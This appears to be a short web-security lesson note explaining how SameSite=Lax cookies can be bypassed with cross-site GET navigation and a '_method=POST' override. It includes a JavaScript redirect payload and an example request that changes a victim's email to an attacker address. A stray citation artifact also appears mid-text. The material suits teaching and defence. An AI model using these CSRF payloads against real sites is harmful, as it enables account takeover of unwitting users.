# Bypassing SameSite Lax Restrictions Using GET Requests

## Overview

SameSite=Lax still allows cookies during:

```text
Top-Level Navigation
+
GET Request
```

This behavior can be abused.

---

# Why The Bypass Works

Lax blocks:

```text
Cross-Site POST
```

but allows:

```text
Cross-Site GET Navigation
```

---

# Basic Attack

```html
<script>
document.location =
"https://target.com/action";
</script>
```

Browser performs:

```text
GET Request
```

and includes cookies. :contentReference[oaicite:3]{index=3}

---

# Method Override Bypass

Some frameworks support:

```http
_method=POST
```

---

# Example

```http
GET /change-email?
email=hacker@evil.com
&_method=POST
```

Server interprets:

```text
GET
        ↓
POST
```

---

# Attack Flow

```text
Victim Visits Evil Site
        ↓
GET Navigation
        ↓
Cookie Sent
        ↓
Method Override
        ↓
Sensitive Action Executed
```

---

# Related Lab

- `lab07-samesite-lax-bypass-via-method-override.md`

---

# Key Takeaways

- SameSite=Lax is not complete CSRF protection.
- GET navigations still include cookies.
- Method override often enables bypasses.